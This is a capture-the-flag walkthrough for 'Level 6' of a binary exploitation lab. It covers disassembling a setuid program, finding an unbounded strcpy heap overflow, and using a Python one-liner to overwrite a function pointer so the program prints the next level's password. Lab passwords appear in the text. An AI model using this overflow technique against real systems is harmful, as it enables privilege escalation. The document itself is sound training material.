# Level 6

## Requirements

- None

## Walkthrough

1. Login
    
    ```bash
    > ssh -p 4242 level6@192.168.1.66
    Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
    
    GCC stack protector support:            Enabled
      Strict user copy checks:                Disabled
      Restrict /dev/mem access:               Enabled
      Restrict /dev/kmem access:              Enabled
      grsecurity / PaX: No GRKERNSEC
      Kernel Heap Hardening: No KERNHEAP
     System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
    ```
    
2. Check file
    
    ```bash
    > ls -l
    total 8
    -rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
    
    > ./level6
    Segmentation fault (core dumped)
    
    > ./level6 qwe
    Nope
    ```
    
3. Analyse using GDB
    
    ```bash
    > gdb level6
    ...
    
    > (gdb) info functions
    All defined functions:
    
    Non-debugging symbols:
    0x080482f4  _init
    0x08048340  strcpy
    0x08048340  strcpy@plt
    0x08048350  malloc
    0x08048350  malloc@plt
    0x08048360  puts
    0x08048360  puts@plt
    0x08048370  system
    0x08048370  system@plt
    0x08048380  __gmon_start__
    0x08048380  __gmon_start__@plt
    0x08048390  __libc_start_main
    0x08048390  __libc_start_main@plt
    0x080483a0  _start
    0x080483d0  __do_global_dtors_aux
    0x08048430  frame_dummy
    0x08048454  n
    0x08048468  m
    0x0804847c  main
    0x080484e0  __libc_csu_init
    0x08048550  __libc_csu_fini
    0x08048552  __i686.get_pc_thunk.bx
    0x08048560  __do_global_ctors_aux
    0x0804858c  _fini
    ```
    
4. We have 3 functions here; `main`, `m` and `n`. 
    
    ```bash
    > (gdb) disas main
    Dump of assembler code for function main:
       0x0804847c <+0>:	push   %ebp
       0x0804847d <+1>:	mov    %esp,%ebp
       0x0804847f <+3>:	and    $0xfffffff0,%esp
       0x08048482 <+6>:	sub    $0x20,%esp
       0x08048485 <+9>:	movl   $0x40,(%esp)
       0x0804848c <+16>:	call   0x8048350 <malloc@plt>
       0x08048491 <+21>:	mov    %eax,0x1c(%esp)
       0x08048495 <+25>:	movl   $0x4,(%esp)
       0x0804849c <+32>:	call   0x8048350 <malloc@plt>
       0x080484a1 <+37>:	mov    %eax,0x18(%esp)
       0x080484a5 <+41>:	mov    $0x8048468,%edx
       0x080484aa <+46>:	mov    0x18(%esp),%eax
       0x080484ae <+50>:	mov    %edx,(%eax)
       0x080484b0 <+52>:	mov    0xc(%ebp),%eax
       0x080484b3 <+55>:	add    $0x4,%eax
       0x080484b6 <+58>:	mov    (%eax),%eax
       0x080484b8 <+60>:	mov    %eax,%edx
       0x080484ba <+62>:	mov    0x1c(%esp),%eax
       0x080484be <+66>:	mov    %edx,0x4(%esp)
       0x080484c2 <+70>:	mov    %eax,(%esp)
       0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
       0x080484ca <+78>:	mov    0x18(%esp),%eax
       0x080484ce <+82>:	mov    (%eax),%eax
       0x080484d0 <+84>:	call   *%eax
       0x080484d2 <+86>:	leave  
       0x080484d3 <+87>:	ret    
    End of assembler dump.
    
    > (gdb) disas m
    Dump of assembler code for function m:
       0x08048468 <+0>:	push   %ebp
       0x08048469 <+1>:	mov    %esp,%ebp
       0x0804846b <+3>:	sub    $0x18,%esp
       0x0804846e <+6>:	movl   $0x80485d1,(%esp)
       0x08048475 <+13>:	call   0x8048360 <puts@plt>
       0x0804847a <+18>:	leave  
       0x0804847b <+19>:	ret    
    End of assembler dump.
    
    > (gdb) disas n
    Dump of assembler code for function n:
       0x08048454 <+0>:	push   %ebp
       0x08048455 <+1>:	mov    %esp,%ebp
       0x08048457 <+3>:	sub    $0x18,%esp
       0x0804845a <+6>:	movl   $0x80485b0,(%esp)
       0x08048461 <+13>:	call   0x8048370 <system@plt>
       0x08048466 <+18>:	leave  
       0x08048467 <+19>:	ret    
    End of assembler dump.
    ```
    
5. Pseudo-code using IDA.
    
    ```c
    int m()
    {
      return puts("Nope");
    }
    
    int n()
    {
      return system("/bin/cat /home/user/level7/.pass");
    }
    
    int main(int argc, const char **argv, const char **envp)
    {
      int (**fn)(void); // [esp+18h] [ebp-8h]
      int buffer; // [esp+1Ch] [ebp-4h]
    
      buffer = malloc(64);
      fn = (int (**)(void))malloc(4);
      *fn = m;
      strcpy(buffer, argv[1]);
      return (*fn)();
    }
    ```
    
6. We have a pointer to the function `m`, however, we want it to point to the function `n`. We also have a call to `strcpy` which can be used to overwrite memory since no size limitation is provided (like `strncpy`). 
Since we plan to exploit an overflow (again), let’s use our classic pattern matching.
    
    ```bash
    
    > (gdb) r "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
    Starting program: /home/user/level6/level6 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
    
    Program received signal SIGSEGV, Segmentation fault.
    0x53535353 in ?? ()
    ```
    
7. Fine, `0x53535353 = SSSS`, so it looks like we have a padding of `72` bytes.
    
    ```bash
    > python -c "print len('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR')"
    72
    ```
    
8. Now, thanks to our first GDB analyse, we know that the function `n` is located at `0x08048454` therefore, let’s add it to our payload, and overwrite the EIP.
    
    ```bash
    > ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
    ```
    

## Documentation

- See previous levels
    
    ```jsx
    //
    // This file was generated by the Retargetable Decompiler
    // Website: https://retdec.com
    //
    
    #include <stdint.h>
    #include <stdlib.h>
    #include <string.h>
    
    // ------------------------ Functions -------------------------
    
    // Address range: 0x804847c - 0x80484d4
    int main(int argc, char ** argv) {
        int32_t * mem = malloc(64); // 0x804848c
        int32_t * mem2 = malloc(4); // 0x804849c
        *mem2 = 0x8048468;
        strcpy((char *)mem, (char *)*(int32_t *)(argc + 4));
        return *mem2;
    }
    
    // --------------------- Meta-Information ---------------------
    
    // Detected compiler/packer: gcc (4.6.3)
    // Detected functions: 1
    
    ```